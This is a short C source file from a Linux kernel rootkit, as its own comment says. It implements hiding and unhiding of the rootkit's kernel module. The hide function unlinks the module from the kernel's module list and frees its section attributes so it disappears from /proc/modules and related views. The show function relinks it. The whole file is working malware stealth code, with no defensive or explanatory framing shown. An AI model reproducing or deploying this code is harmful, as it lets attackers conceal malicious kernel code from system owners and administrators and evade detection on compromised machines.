#include "module_hiding.h"
#include "utils.h"

/* pointer to the module entries above the rootkit in /proc/modules */
static struct list_head *prev_module;

unsigned int module_hidden = 0x0;

void do_hide_module(void)
{
  /* check if module is already hidden */
  if (module_hidden)
    return;
  
  /* hide module from procfs view */
  prev_module = THIS_MODULE->list.prev;
  list_del_rcu((void *)&THIS_MODULE->list);

  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;

  /* mark the module as hidden */
  module_hidden = (unsigned int)0x1;
}

void do_show_module(void)
{
  /* check if module is already shown */
  if (!module_hidden)
    return;

  /* show module in procfs view */
  list_add(&THIS_MODULE->list, prev_module);

  /* mark the module as not hidden */
  module_hidden = (unsigned int)0x0;
}
